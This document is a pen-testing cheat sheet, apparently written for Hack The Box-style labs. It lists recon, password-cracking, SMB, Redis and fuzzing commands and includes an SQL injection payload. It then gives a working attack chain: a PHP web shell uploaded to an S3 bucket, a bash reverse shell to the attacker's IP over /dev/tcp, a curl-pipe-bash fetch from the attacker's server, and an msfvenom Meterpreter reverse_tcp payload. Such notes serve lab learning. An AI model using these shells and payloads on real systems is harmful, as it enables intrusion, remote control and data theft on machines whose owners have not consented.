###Pen-testing Tips and Tools

# `sudo` Exploitation

To get all commands that can be run with `sudo`:
sudo -l

It can be exploited with `less` to gain shell access.

# `nmap` (Network Mapper)

To probe open ports and check their service/version:
nmap -sV {ip}


To check all ports:
nmap -p- {ip}


To perform OS detection:
nmap -O {ip}


# `telnet`

Connect to a server using Telnet:
telnet {ip}


# `ftp`

Connect to a server using FTP. You can connect without an account by using the username "anonymous":
ftp {ip}


# `smbclient`

Used to connect to Windows environments over SMB/CIFS.

To list all available shares:
smbclient -L {ip}


To connect to a specific share:
smbclient {ip}/share


# `redis-cli`

Used to connect to a Redis database.

To access a remote Redis server:
redis-cli -h {ip} -p {port}


Some useful commands:
- `SELECT 0`: Select index database.
- `DBSIZE`: Get the size of the database.
- `KEYS *`: Show all keys.
- `GET {key}`: Show the content of a specific key.

# `dirb`

A tool for scanning HTTP pages. You can specify a wordlist to discover directories and files on a website.
dirb {url} /usr/share/wordlist


##SQL Injection

Exploiting SQL databases through unsanitized input.
- Example: `admin'#` to comment out the rest of the SQL query.

# `mysql` and `MariaDB`

To connect to SQL databases:
mysql -h {ip} -u {user}


Some useful SQL commands:
- `SHOW DATABASES;`
- `USE {database};`
- `SELECT * FROM {table};`

##File Inclusion Vulnerability

Exploiting PHP scripts that include files from URLs without proper sanitization.

# `responder`

A tool for LLMNR, NBT-NS, and MDNS poisoning techniques, which involve intercepting and responding to network name resolution requests.

To run `responder`:
sudo responder -I tun0


You can use this to redirect or manipulate network traffic.

# `john` (John the Ripper)

A tool for cracking password hashes.

To crack a hash:
john hash.txt


You can also use a wordlist to crack the hash:
john -w=/usr/share/wordlist hash.txt


# `evil-winrm`

Exploit and control Windows machines remotely.
evil-winrm -i {ip} -u {user} -p {password}


This is particularly powerful with administrator access.

# `wappanalizer`

A Firefox extension to analyze the technology stack used by websites.

# `gobuster`

A fuzzer tool for finding domains and directories in URLs using wordlists.

To find subdomains:
gobuster vhost -u {domain} -w {wordlist} --append-domain


# `nc` (Netcat)

To listen for a reverse shell:
nc -lvnp {port}


# `awscli`

Used to interact with AWS servers, domains, and S3 buckets.

To execute commands on an endpoint:
aws --endpoint={url} {type} {command}


##Reverse Shell in AWS S3

If an AWS bucket is found, you can upload a script to execute commands on it.

1. Create a PHP script that executes commands:
echo '<?php system($_GET["cmd"]); ?>' > shell.php


2. Upload the script to the bucket:
aws --endpoint={url} s3 cp shell.php s3://thetoppers.htb


3. Create a reverse shell script and listen on your machine:
Reverse shell script
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

##Netcat
nc -nvlp 1337


4. Launch a web server on your machine and visit the URL:
python3 -m http.server 8000
{url}/shell.php?cmd=curl%20<IP_ADDRESS>:8000/shell.sh|bash


##Metasploit

Set up a reverse TCP shell on a Windows MS-SQL server.

In MSFVenom, create a payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} -f exe -o payload.exe


In MSF6, use Metasploit:
use exploit/multi/handler
set payload /windows/meterpreter/reverse_tcp
setg LHOST {ip}
run


##Burp Suite

A tool to track all network and proxy traffic.

You can use the FoxyProxy extension to intercept and modify requests.

##Developer Mode

You can use the browser's developer tools to inspect and modify cookies.

# `wfuzz`

An HTTP request fuzzer that uses wordlists to replace and try different parameters.

Example with wordlist for file paths and parameters:
wfuzz -c -z file,/usr/share/wfuzz/wordlist/injection/SQL.txt -d “username=1&password=FUZZ” --hc 404 http://10.10.11.224:55555/FUZZ
